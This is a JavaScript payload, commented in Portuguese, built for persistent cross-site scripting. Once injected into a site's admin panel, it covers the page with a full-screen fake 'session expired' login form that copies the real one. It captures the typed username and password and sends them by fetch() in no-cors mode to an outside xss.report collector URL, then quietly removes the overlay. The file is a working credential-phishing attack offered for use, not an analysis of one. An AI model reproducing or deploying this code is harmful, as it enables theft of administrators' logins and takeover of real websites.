/**
 * Emílio Farias - Persistent XSS Fake Login Modal
 * Gera um iframe/modal fullscreen idêntico à página de login original.
 * Exfiltra credenciais via POST para o Webhook remoto.
 */

(function() {
    // 1. Verifica se o Fake Login já foi injetado nesta sessão
    if(document.getElementById('phishing_modal_111')) return;

    // 2. CSS para bloquear a tela inteira (Modal Fullscreen) por cima do painel administrativo
    var css = `
    #phishing_modal_111 {
        position: fixed;
        top: 0; left: 0;
        width: 100vw; height: 100vh;
        background: #000;
        z-index: 2147483647; /* Z-Index máximo do navegador */
        overflow-y: auto;
    }
    
    /* Reprodução exata de font-faces e estilos essenciais do login */
    .p-login_pd { font-family: Arial, sans-serif; }
    .p-w520 { width: 520px; }
    .p-pt100 { padding-top: 100px; }
    .p-pb50 { padding-bottom: 50px; }
    .p-m-a { margin: 0 auto; }
    .p-h50 { height: 50px; }
    .p-pt25 { padding-top: 25px; }
    .p-pb18 { padding-bottom: 18px; }
    .p-back_2FACD8 { background-color: #2FACD8; }
    .p-cor_fff { color: #fff; }
    .p-tac { text-align: center; }
    .p-fz28 { font-size: 28px; }
    .p-ttu { text-transform: uppercase; }
    .p-pt30 { padding-top: 30px; }
    .p-pl25 { padding-left: 25px; }
    .p-pr25 { padding-right: 25px; }
    .p-pb10 { padding-bottom: 10px; }
    .p-back_F8F8F8 { background-color: #F8F8F8; }
    .p-db { display: block; }
    .p-mb16 { margin-bottom: 16px; }
    .p-design { height: 47px; line-height: 47px; border: 1px solid #E6E6E6; padding: 0 10px; font-size: 14px; box-sizing: border-box; }
    .p-w100p { width: 100%; }
    .p-p20 { padding: 20px; }
    .p-tar { text-align: right; }
    .p-back_F1F1F1 { background-color: #F1F1F1; }
    .p-botao { cursor: pointer; padding: 15px 20px; font-size: 11px; text-transform: uppercase; color: #fff; border: none; border-radius: 5px; }
    .p-back_9E9E9E { background-color: #9E9E9E; }
    .p-back_2EADD4 { background-color: #2EADD4; }
    .p-pl10 { padding-left: 10px; }
    .p-pr10 { padding-right: 10px; }
    `;

    var style = document.createElement('style');
    style.type = 'text/css';
    if (style.styleSheet) { style.styleSheet.cssText = css; } else { style.appendChild(document.createTextNode(css)); }
    document.head.appendChild(style);

    // 3. Monta o HTML clonado
    var div = document.createElement('div');
    div.id = 'phishing_modal_111';
    div.className = 'p-login_pd';
    // Repassamos a estrutura HTML que nos foi enviada convertida para classes pré-fixadas (para não dar conflito)
    div.innerHTML = `
        <div class="p-w520 p-pt100 p-pb50 p-m-a" style="max-width:90%;">
            <div class="p-h50"></div>
            <h1 class="p-pt25 p-pb18 p-back_2FACD8" style="margin:0;">
                <p class="p-cor_fff p-tac p-fz28 p-ttu" style="margin:0;">Administração do Site</p>
                <p style="text-align:center; color:#fff; font-size:12px; margin-top:5px; font-weight:normal;">Sua Sessão Expirou. Por favor, efetue o login novamente.</p>
            </h1>

            <form id="p-fake-form" onsubmit="return false;">
                <div class="p-pt30 p-pl25 p-pr25 p-pb10 p-back_F8F8F8">
                    <label class="p-db p-mb16">
                        <input type="text" id="p_login" class="p-design p-w100p p-pl10 p-pr10" placeholder="Login" required />
                    </label>

                    <label class="p-db p-mb16">
                        <input type="password" id="p_senha" class="p-design p-w100p p-pl10 p-pr10" placeholder="Senha" required />
                    </label>
                </div>

                <div class="p-p20 p-tar p-back_F1F1F1">
                    <button type="button" class="p-botao p-back_9E9E9E" style="margin-right:10px;"> Esqueci minha senha? </button>
                    <button type="button" id="p-submit-btn" class="p-botao p-back_2EADD4"> Entrar </button>
                </div>
            </form>
        </div>
    `;

    document.body.appendChild(div);

    // 4. Lógica de Interceptação do Botão Entrar
    document.getElementById('p-submit-btn').addEventListener('click', function() {
        var u = document.getElementById('p_login').value;
        var p = document.getElementById('p_senha').value;
        
        if(u === "" || p === "") {
            alert("Preencha login e senha");
            return;
        }

        // Webhook apontando para sua estrutura de coleta no XSS.Report ou API Customizada
        // A chave e repo do GitHub serão configuradas no painel do XSS.
        var targetWebhook = "https://xss.report/c/emilio_capture";
        
        fetch(targetWebhook + "?u=" + encodeURIComponent(u) + "&p=" + encodeURIComponent(p), {
            mode: 'no-cors', // Exfiltra stealth sem problemas de CORS
            method: 'GET'
        }).then(() => {
            // Remove a tela e libera o Adm pra continuar o trabalho dele.
            document.getElementById('phishing_modal_111').remove();
        }).catch(() => {
            document.getElementById('phishing_modal_111').remove();
        });
    });
})();
